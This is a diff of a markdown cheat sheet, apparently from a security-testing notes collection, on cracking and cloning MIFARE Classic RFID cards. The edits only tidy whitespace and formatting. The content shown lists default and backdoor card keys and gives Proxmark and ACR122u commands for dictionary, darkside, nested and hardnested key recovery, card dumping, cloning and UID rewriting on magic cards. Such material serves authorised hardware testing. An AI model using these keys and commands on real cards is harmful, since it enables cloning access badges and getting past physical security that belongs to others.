@@ -4,17 +4,16 @@
 
 New method for Proxmark : `hf mf autopwn`
 
-
 ### Dictionary attack
 
 Common keys to try against the card when attempting a dictionnary attack.
 
 | Key | Description |
 | ---- | ---- |  
-| FFFFFFFFFFFF | Default key | 
-| 000000000000 | Blank key | 
-| A396EFA4E24F | FM11RF08S universal backdoor key | 
-| A31667A8CEC1 | FM11RF08 older backdoor key | 
+| FFFFFFFFFFFF | Default key |
+| 000000000000 | Blank key |
+| A396EFA4E24F | FM11RF08S universal backdoor key |
+| A31667A8CEC1 | FM11RF08 older backdoor key |
 
 More keys and dictionnaries can be found at the following links:
 
@@ -28,10 +27,9 @@ hf mf chk *1 ? d default_keys.dic
 hf mf chk 0 A default_keys.dic # Dictionary attack with file: default_keys.dic
 ```
 
-
 ### Darkside attack (PRNG Weak)
 
-**Proxmark method**
+**Proxmark method**:
 
 ```powershell
 pm3> hf search
@@ -45,7 +43,7 @@ Found valid key:ffffffffffff # KEY_FOUND
 pm3> hf mf chk 0 A KEY_FOUND    (Check Found Key On Block 0 A)
 ```
 
-**ACR122u method**
+**ACR122u method**:
 
 ```powershell
 # start cracking the first key of the first sector. 
@@ -57,7 +55,7 @@ mfcuk -C -R 3:A -v 3 -s 250 -S 250 -o mycard.mfc
 
 > Need to find a default key to extract the others
 
-**Proxmark method**
+**Proxmark method**:
 
 ```powershell
 hf search
@@ -75,7 +73,7 @@ python pm3_mfd2eml.py dumpdata.bin dumpdata.eml
 pm3> hf mf cload dumpdata
 ```
 
-**ACR122u method**
+**ACR122u method**:
 
 ```powershell
 nfc-list
@@ -92,7 +90,7 @@ nfc-mfclassic W a key.mfd data.mfd # write data and sector 0
 
 For newest MIFARE Classic and MIFARE Plus SL1
 
-**Proxmark method**
+**Proxmark method**:
 
 :warning: NOTE: These hardware changes resulted in the Proxmark 3 Easy being incapable of performing several of the Proxmark's advanced features, including the Mifare Hard-Nested attacks. In other word you need a real Proxmark, not a cheap chinese copy.
 
@@ -113,7 +111,7 @@ hf mf hardnested 0 A 8829da9daf76 4 A w
 ./solve_piwi_bs 0xcafec0de.bin
 ```
 
-**ACR122u method**
+**ACR122u method**:
 
 With the key n°A a0a1a2a3a4a5 for sector 0 and we want key n°A for sector 1. This method can be reused for every sectors.
 
@@ -174,7 +172,6 @@ hf 14a raw -p 43
 hf 14a raw -p -c a0 00
 hf 14a raw -p -c de ad be ef 22 08 04 00 46 59 25 58 49 10 23 02
 ```
-
 
 ### Write and read sectors
 
@@ -276,8 +273,6 @@ hf mf wrbl 0 a FFFFFFFFFFFF 01020304040000000000000000000000
 ```
 
 Again, watch out to have correct BCC and avoid Cascading Tag (0x88) as first byte of UID, or you may make the card unselectable (i.e. brick it).
-
-
 
 ## References
 
